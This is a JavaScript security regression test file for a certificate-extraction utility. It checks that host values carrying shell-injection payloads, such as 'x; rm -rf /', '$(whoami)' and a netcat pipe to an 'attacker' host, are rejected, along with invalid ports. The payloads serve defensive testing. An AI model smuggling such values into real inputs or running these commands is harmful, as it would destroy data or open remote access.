// Copyright (c) 2026 Electronic Arts Inc. All rights reserved.

/**
 * Security regression tests for extractRemoteServerCertificate.
 *
 * The extractor previously built a shell command by string-interpolating host/port,
 * which was an injection sink. It now spawns openssl without a shell and validates
 * host/port up front. These tests assert it fails closed on anything that isn't a
 * plain hostname/IP and valid port — a shell-metacharacter host must never reach a
 * child process.
 */

import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { extractRemoteServerCertificate } from '../utils/certificateUtils.js'

describe('extractRemoteServerCertificate input validation', () => {
  const maliciousHosts = [
    'x; rm -rf /',
    'localhost && touch /tmp/pwned',
    '$(whoami)',
    '`id`',
    'host|nc attacker 1234',
    'a\nb',
    'host with spaces',
  ]

  for (const host of maliciousHosts) {
    it(`returns null (does not execute) for injection-style host: ${JSON.stringify(host)}`, async () => {
      // A short timeout ensures that even if validation regressed and openssl were
      // spawned, the test wouldn't hang — but the expectation is immediate null.
      const result = await extractRemoteServerCertificate(host, 443, 500)
      assert.equal(result, null)
    })
  }

  const invalidPorts = [0, -1, 70000, 1.5, Number.NaN]
  for (const port of invalidPorts) {
    it(`returns null for out-of-range/invalid port: ${port}`, async () => {
      const result = await extractRemoteServerCertificate('example.com', port, 500)
      assert.equal(result, null)
    })
  }

  it('accepts a well-formed host/port shape (connection itself may fail, returns null gracefully)', async () => {
    // 127.0.0.1 with an unlikely-open port: passes validation, openssl fails to
    // connect, and the function resolves to null rather than throwing.
    const result = await extractRemoteServerCertificate('127.0.0.1', 1, 1000)
    assert.equal(result, null)
  })
})
